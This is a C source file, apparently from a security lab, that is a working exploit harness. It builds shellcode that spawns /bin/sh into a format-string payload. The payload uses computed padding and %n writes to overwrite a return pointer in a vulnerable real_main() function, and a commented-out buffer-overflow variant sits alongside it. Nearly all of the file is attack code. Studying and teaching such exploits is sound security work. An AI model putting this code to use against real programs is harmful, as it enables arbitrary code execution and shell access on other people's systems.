
#include "stdio.h"
#include "stdlib.h"
#include "string.h"

#define DEBUG 1
#define FORMATBUFFERSIZE 2048

union
{
    unsigned long int integer;
    unsigned char byte[4];
} intUnion;

union
{
    unsigned short int shortinteger;
    unsigned char byte[2];
} shortUnion;

char shellcode[] = \
"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0a\x04\x01\xcd\x80\x90";//this shellcode has x3 NOPs for padding, length=28

char spacer[] = \
"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.";//This spacer was altered from what is present in the complete version of the exploit

char writer[] = "%n";

extern int real_main(int argc, char **argv);

int main(int argc, char **argv) {

	char taintedbuf[8192] __attribute__ ((aligned (8)));
	int taintedbufWritePtr, taintedbufWriteCnt, diff;
	unsigned long int shellcodeaddr, retfptraddr;

	if (argc==3) {
		sscanf(argv[1], "%lx", &shellcodeaddr);
		sscanf(argv[2], "%lx", &retfptraddr);
	} else {
		printf("Wrong arguments..");
		return -1;
	}

	printf("shellcodeaddr=0x%lx, retfptraddr=0x%lx\n",shellcodeaddr, retfptraddr);
	memset(taintedbuf,0,sizeof(taintedbuf));
	taintedbufWritePtr=0;
	taintedbufWriteCnt=0;

	/*
	 * Buffer Overflow exploit
	strcpy(taintedbuf, shellcode);

	int diff = retfptraddr - shellcodeaddr - strlen(taintedbuf);
	int i;
	char padding[50000];
	for(i = 0; i < diff; i++) {
		padding[i] = '-';
	}
	padding[i] = '\0';
	strcat(taintedbuf, padding);
	taintedbufWritePtr = strlen(taintedbuf);

	intUnion.integer = shellcodeaddr;
	taintedbuf[taintedbufWritePtr+3]=intUnion.byte[3];
	taintedbuf[taintedbufWritePtr+2]=intUnion.byte[2];
	taintedbuf[taintedbufWritePtr+1]=intUnion.byte[1];
	taintedbuf[taintedbufWritePtr]=intUnion.byte[0];
	taintedbufWritePtr+=4;

	taintedbuf[taintedbufWritePtr] = '\0';
	*/

	/**
	 * Format String vulnerability exploit
	 */
	memset(taintedbuf,0,sizeof(taintedbuf));//clear the buffer
	taintedbufWritePtr = 0;
	taintedbufWriteCnt = 0;
	//Construction of the tainted buffer

	strcpy(taintedbuf, shellcode);
	strcat(taintedbuf, "AAAA");

	taintedbufWritePtr = strlen(taintedbuf);

	//Write return pointer address into tainted buffer
	// Address 1
	intUnion.integer=retfptraddr;
	taintedbuf[taintedbufWritePtr+3]=intUnion.byte[3];
	taintedbuf[taintedbufWritePtr+2]=intUnion.byte[2];
	taintedbuf[taintedbufWritePtr+1]=intUnion.byte[1];
	taintedbuf[taintedbufWritePtr]=intUnion.byte[0];
	taintedbufWritePtr+=4;

	//taintedbuf[taintedbufWritePtr] = '\0';
	taintedbufWriteCnt=taintedbufWriteCnt+4;
	// Address 2
	intUnion.integer=(retfptraddr+1);
	taintedbuf[taintedbufWritePtr+3]=intUnion.byte[3];
	taintedbuf[taintedbufWritePtr+2]=intUnion.byte[2];
	taintedbuf[taintedbufWritePtr+1]=intUnion.byte[1];
	taintedbuf[taintedbufWritePtr]=intUnion.byte[0];
	taintedbufWritePtr+=4;

	//taintedbuf[taintedbufWritePtr] = '\0';
	taintedbufWriteCnt=taintedbufWriteCnt+4;
	// Address 3
	intUnion.integer=(retfptraddr+2);
	taintedbuf[taintedbufWritePtr+3]=intUnion.byte[3];
	taintedbuf[taintedbufWritePtr+2]=intUnion.byte[2];
	taintedbuf[taintedbufWritePtr+1]=intUnion.byte[1];
	taintedbuf[taintedbufWritePtr]=intUnion.byte[0];
	taintedbufWritePtr+=4;

	//taintedbuf[taintedbufWritePtr] = '\0';
	taintedbufWriteCnt=taintedbufWriteCnt+4;
	// Address 4
	intUnion.integer=(retfptraddr+3);
	taintedbuf[taintedbufWritePtr+3]=intUnion.byte[3];
	taintedbuf[taintedbufWritePtr+2]=intUnion.byte[2];
	taintedbuf[taintedbufWritePtr+1]=intUnion.byte[1];
	taintedbuf[taintedbufWritePtr]=intUnion.byte[0];
	taintedbufWritePtr+=4;

	taintedbuf[taintedbufWritePtr] = '\0';
	taintedbufWriteCnt=taintedbufWriteCnt+4;

	strcat(taintedbuf, spacer);
	// Original spacer writes C0 bytes, we need to extract last two bytes of address
	// from the shellcode's address and dynamically pad it
	int size = 0, IA1 = 0, IA2 = 0, IA3 = 0, IA4 = 0;
	char temp[200];
	printf("Length of string is: %d\n", strlen(taintedbuf));
	intUnion.integer = shellcodeaddr;
	sprintf(temp, "%lx", 0xC0);
	// convert size to int
	size = (int) strtol(temp, NULL, 16);

	// convert byte[0] to int
	sprintf(temp, "%lx", intUnion.byte[0]);
	IA1 = (int) strtol(temp, NULL, 16); // convert lower address byte to int
	// convert byte[0] to int
	sprintf(temp, "%lx", intUnion.byte[1]);
	IA2 = (int) strtol(temp, NULL, 16); // convert lower address byte to int
	// convert byte[0] to int
	sprintf(temp, "%lx", intUnion.byte[2]);
	IA3 = (int) strtol(temp, NULL, 16); // convert lower address byte to int
	// convert byte[0] to int
	sprintf(temp, "%lx", intUnion.byte[3]);
	IA4 = (int) strtol(temp, NULL, 16); // convert lower address byte to int

	printf("Int size is: %d ; Lower byte in int is: %d ; Original lower byte value is: %lx \n", size, IA1, intUnion.byte[0]);

	diff = -1;
	int m256 = 0;
	while(diff < 0) {
		diff = ((m256 * 256) + IA1) - size;
		m256++;
	}
	printf("#1 : Should pad the string with %d bytes \n", diff);
	char padding[4096];
	int i = 1, j = 0;
	for(i = 1; i <= diff; i++, j++) {
		padding[j] = '-';
	}
	padding[j] = '\0';
	strcat(taintedbuf, padding);
	//write to arbitary address
	strcat(taintedbuf, writer);
	//padding for first write completed
	//prepare padding for next write

	// write to address retfptradd + 1
	memset(padding,0,sizeof(padding));//clear the buffer
	diff = -1;
	m256 = 0;
	while(diff < 0) {
		diff = ((m256 * 256) + IA2) - IA1;
		m256++;
	}
	for(i = 1, j = 0; i <= diff; i++, j++) {
		padding[j] = '-';
	}
	padding[j] = '\0';
	printf("#2 : Should pad the string with %d bytes \n", diff);
	// add padding to fix address
	strcat(taintedbuf, padding);
	strcat(taintedbuf, writer);
	// write to address retfptradd + 2
	memset(padding,0,sizeof(padding));//clear the buffer
	diff = -1;
	m256 = 0;
	while(diff < 0) {
		diff = ((m256 * 256) + IA3) - IA2;
		m256++;
	}
	for(i = 1, j = 0; i <= diff; i++, j++) {
		padding[j] = '-';
	}
	padding[j] = '\0';
	printf("#3 : Should pad the string with %d bytes \n", diff);
	// add padding to fix address
	strcat(taintedbuf, padding);
	strcat(taintedbuf, writer);
	// write to address retfptradd + 3
	memset(padding,0,sizeof(padding));//clear the buffer
	diff = -1;
	m256 = 0;
	while(diff < 0) {
		diff = ((m256 * 256) + IA4) - IA3;
		m256++;
	}
	for(i = 1, j = 0; i <= diff; i++, j++) {
		padding[j] = '-';
	}
	padding[j] = '\0';
	printf("#4 : Should pad the string with %d bytes \n", diff);
	strcat(taintedbuf, padding);
	strcat(taintedbuf, writer);

	/**
	 * Common trigger code
	 */
	printf("%s\n", taintedbuf);

	strcpy(argv[1], "-a");
	argv[2] = taintedbuf;
	argc = 3;
	int ret;
	ret = real_main(argc, argv);

	return ret;
}
